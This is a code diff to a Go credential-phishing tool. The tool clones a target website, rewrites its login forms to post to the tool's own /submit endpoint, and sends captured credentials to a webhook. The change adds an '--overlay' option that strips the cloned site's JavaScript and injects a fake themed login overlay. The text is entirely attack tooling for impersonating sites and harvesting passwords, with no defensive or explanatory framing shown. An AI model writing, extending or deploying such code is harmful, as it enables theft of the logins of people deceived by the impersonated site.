@@ -40,6 +40,7 @@ func run() error {
 	flag.StringVar(&cfg.UserAgent, "user-agent", cfg.UserAgent, "User-Agent string for cloning requests")
 	flag.StringVar(&cfg.WebhookURL, "webhook", "", "Webhook URL for credential notifications")
 	flag.BoolVar(&cfg.InsecureTLS, "insecure", false, "Skip TLS verification when cloning target")
+	flag.BoolVar(&cfg.Overlay, "overlay", false, "Strip site JS and inject a themed login overlay")
 	flag.BoolVar(&cfg.Verbose, "verbose", false, "Enable verbose debug output")
 	flag.Parse()
 
@@ -69,20 +70,29 @@ func run() error {
 	}
 	fmt.Println("[*] Clone complete")
 
-	// Rewrite form actions to /submit
+	// Post-process cloned HTML
 	indexPath := filepath.Join(cloneDir, "index.html")
 	htmlBytes, err := os.ReadFile(indexPath)
 	if err != nil {
 		return fmt.Errorf("read index.html: %w", err)
 	}
-	rewritten, err := rewriter.RewriteForms(string(htmlBytes))
-	if err != nil {
-		return fmt.Errorf("rewrite forms: %w", err)
+	var rewritten string
+	if cfg.Overlay {
+		rewritten, err = rewriter.ApplyOverlay(string(htmlBytes))
+		if err != nil {
+			return fmt.Errorf("apply overlay: %w", err)
+		}
+		fmt.Println("[*] Login overlay injected (site JS stripped)")
+	} else {
+		rewritten, err = rewriter.RewriteForms(string(htmlBytes))
+		if err != nil {
+			return fmt.Errorf("rewrite forms: %w", err)
+		}
+		fmt.Println("[*] Forms rewritten")
 	}
 	if err := os.WriteFile(indexPath, []byte(rewritten), 0644); err != nil {
 		return fmt.Errorf("write index.html: %w", err)
 	}
-	fmt.Println("[*] Forms rewritten")
 
 	// Initialize logger
 	log, err := logger.New(cfg.OutputFile, cfg.TargetURL)
